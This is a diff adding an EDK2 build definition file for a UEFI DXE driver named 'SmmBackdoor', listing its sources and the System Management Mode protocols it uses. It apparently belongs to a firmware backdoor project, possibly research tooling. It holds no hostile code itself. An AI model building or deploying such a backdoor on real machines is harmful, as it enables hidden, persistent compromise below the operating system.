@@ -1,0 +1,38 @@
+[defines]
+    INF_VERSION = 0x00010005
+    BASE_NAME = SmmBackdoor
+    FILE_GUID = b45bb82d-4485-47cb-aac1-7ae8aa60f711
+    MODULE_TYPE = DXE_DRIVER
+    ENTRY_POINT = BackdoorMain
+
+[Sources]
+    main.c
+    globals.c
+    efivars.c
+    locate.c
+    common_string.c
+    smm.c
+    dxe.c
+
+[Sources.X64]
+    x64_locate.asm
+
+[Packages]
+    MdePkg/MdePkg.dec
+    MdeModulePkg/MdeModulePkg.dec
+    StdLib/StdLib.dec
+    IntelFrameworkPkg/IntelFrameworkPkg.dec 
+
+[LibraryClasses]
+    UefiDriverEntryPoint
+    UefiBootServicesTableLib
+
+[Protocols]
+    gEfiSmmBaseProtocolGuid
+    gEfiSmmSwDispatchProtocolGuid
+    gEfiSmmPeriodicTimerDispatchProtocolGuid
+    gEfiSmmCpuProtocolGuid
+
+
+[Depex]
+    TRUE
